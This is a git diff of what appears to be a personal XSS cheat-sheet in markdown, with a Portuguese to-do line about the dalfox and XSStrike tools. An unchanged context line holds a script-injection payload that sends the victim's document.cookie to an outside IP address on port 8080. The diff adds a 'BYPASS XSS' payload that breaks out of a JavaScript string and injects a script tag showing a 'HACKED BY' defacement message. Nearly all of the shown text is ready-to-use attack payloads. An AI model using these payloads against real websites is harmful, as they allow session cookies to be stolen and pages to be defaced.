@@ -164,6 +164,12 @@ a.send();
 
 "><script>new Image().src='http://10.10.15.190:8080/index.php?c='+document.cookie</script>
 ```
+BYPASS XSS 
+
+```
+1'});});<​/script><​script>prompt("HACKED BY \nKUCINGPINTAR")<​/script>
+```
+<img width="883" height="250" alt="image" src="https://github.com/user-attachments/assets/d3d42f85-80b4-4b4e-9b7f-4f1248a4597b" />
 
 - falar ainda sobre dalfox e xss strike
 
